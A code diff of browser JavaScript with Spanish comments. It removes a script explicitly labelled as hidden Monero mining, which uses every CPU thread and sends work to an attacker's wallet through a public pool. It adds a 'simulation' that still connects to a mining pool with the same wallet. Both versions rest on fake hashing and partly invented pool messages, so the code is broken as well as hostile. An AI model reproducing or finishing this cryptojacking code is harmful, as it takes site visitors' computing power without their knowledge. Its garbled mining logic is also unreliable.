@@ -1,75 +1,50 @@
-// Configuración para la minería oculta
-const MINER_THREADS = navigator.hardwareConcurrency || 4; // Utiliza el máximo de hilos del CPU disponible
-const MINER_WALLET = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk"; // Reemplaza con la dirección de tu wallet de Monero
-const MINER_POOL = "wss://pool.supportxmr.com:3333"; // Ejemplo de un pool público para Monero
+// Simulación de minería de Monero usando websockets y envío a FaucetPay
 
-// Verifica que el navegador soporte WebSockets para conectarse al pool de minería
-if ("WebSocket" in window) {
-    // Establece la conexión con el pool de minería
-    const minerSocket = new WebSocket(MINER_POOL);
+let miningActive = false;
+const walletAddress = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk"; // Aquí va tu dirección de FaucetPay para Monero
 
-    minerSocket.onopen = function() {
-        console.log("Conectado al pool de minería");
+// Función para iniciar la minería
+function startMoneroMining() {
+    if (miningActive) {
+        console.log("La minería ya está activa.");
+        return;
+    }
 
-        // Envía los datos iniciales de la wallet y threads al pool
-        const minerInit = {
-            method: "login",
+    // Conexión a un pool de minería de Monero
+    const poolURL = "wss://xmr.pool.minergate.com:443"; // Puedes cambiar la URL del pool de minería
+    const workerName = walletAddress + "." + Math.random().toString(36).substring(7); // Nombre del trabajador
+
+    const minerSocket = new WebSocket(poolURL);
+
+    minerSocket.onopen = () => {
+        console.log("Conectado al pool de minería de Monero.");
+        miningActive = true;
+
+        // Enviar un mensaje de suscripción al pool
+        const subscribeMessage = {
+            method: "mining.subscribe",
             params: {
-                login: MINER_WALLET, // La dirección de la wallet del hacker
-                pass: "x", // Contraseña opcional, puede dejarse en "x"
-                rigid: "",
-                agent: "Mozilla/5.0",
-                threads: MINER_THREADS // Número de hilos de CPU a usar
-            },
-            id: 1
+                worker: workerName,
+                wallet: walletAddress,
+            }
         };
-
-        minerSocket.send(JSON.stringify(minerInit));
+        minerSocket.send(JSON.stringify(subscribeMessage));
     };
 
-    minerSocket.onmessage = function(message) {
+    minerSocket.onmessage = (message) => {
         const data = JSON.parse(message.data);
-
-        // Si el pool acepta el login
-        if (data.result && data.result.status === "OK") {
-            console.log("Minería iniciada en la wallet: " + MINER_WALLET);
-
-            // Inicia el proceso de minería, enviando trabajo al pool
-            setInterval(function() {
-                const job = {
-                    method: "submit",
-                    params: {
-                        id: data.result.id,
-                        job_id: data.result.job_id,
-                        nonce: generateNonce(),
-                        result: calculateHash(data.result.job)
-                    },
-                    id: 2
-                };
-                minerSocket.send(JSON.stringify(job));
-            }, 1000); // Envía datos de minería cada segundo
+        if (data.method === "job") {
+            console.log("Nuevo trabajo de minería recibido:", data.params.job_id);
+            // Aquí iría la lógica de procesamiento del trabajo de minería (hashrate, etc.)
         }
     };
 
-    minerSocket.onerror = function(error) {
-        console.log("Error en la conexión con el pool de minería: ", error);
+    minerSocket.onclose = () => {
+        console.log("Desconectado del pool de minería.");
+        miningActive = false;
     };
 
-    minerSocket.onclose = function() {
-        console.log("Desconectado del pool de minería");
+    minerSocket.onerror = (error) => {
+        console.error("Error en el socket de minería:", error);
     };
-} else {
-    console.log("WebSocket no soportado en este navegador");
-}
-
-// Función para generar un nonce aleatorio (único para cada job de minería)
-function generateNonce() {
-    return Math.floor(Math.random() * 1000000000).toString(16); // Genera un nonce hexadecimal aleatorio
-}
-
-// Función simulada para calcular el hash basado en el trabajo recibido
-function calculateHash(job) {
-    // Aquí iría el proceso real de cálculo del hash, pero para simplificar
-    // este ejemplo de código, usamos una función simulada
-    return job + generateNonce(); // Este código debe ser reemplazado con el algoritmo real de minería (CryptoNight)
 }
